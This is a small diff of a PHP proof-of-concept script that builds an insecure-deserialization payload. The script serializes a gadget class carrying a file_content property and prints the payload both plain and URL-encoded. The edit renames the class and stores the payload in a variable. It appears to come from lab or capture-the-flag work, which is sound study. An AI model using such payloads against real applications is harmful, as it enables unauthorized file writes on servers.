@@ -10,7 +10,9 @@ class TargetClass {
     public $file_content = '<h1>Testing</h1>';
 }
 
-echo "Plain Payload: \n" . serialize(new DatabaseExport) . "\n";
-echo "URL Encoded Payload: \n" . urlencode(serialize(new DatabaseExport)) . "\n";
+$payload = serialize(new TargetClass);
+
+echo "Plain Payload: \n" . $payload . "\n";
+echo "URL Encoded Payload: \n" . urlencode($payload) . "\n";
 
 ?>
